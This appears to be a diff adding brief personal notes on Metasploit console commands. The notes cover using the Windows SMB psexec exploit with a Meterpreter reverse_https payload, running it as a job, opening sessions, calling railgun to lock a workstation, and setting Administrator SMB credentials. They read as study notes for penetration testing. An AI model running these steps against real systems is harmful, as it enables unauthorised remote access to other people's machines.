@@ -1,0 +1,25 @@
+		
+----------------------------------------------Metasploit Commands-------------------------------------------------
+>banner(change to cow because why not)
+> ? (works like a cisco router)
+> use exploit/windows/smb/psexec (PSEXEC)
+>show options (see what is set and what is available)
+> set PAYLOAD windows/meterpreter/reverse_https (changes the )
+>exploit -h (help)
+>exploit -j (runs the job)
+>sessions -i 1 (interact with session 1)
+> irb (interpreter for ruby/ ruby shell)
+>client.railgun.user32.LockWorkStation() 
+>>exit
+
+>edit file.exe
+>>wq(write quit)
+
+>info
+>reload
+
+>load +tab(list of plugins| can also be found at metasploit-framework/plugins)
+
+
+>set SMBUser Administrator
+>>set SMBPass
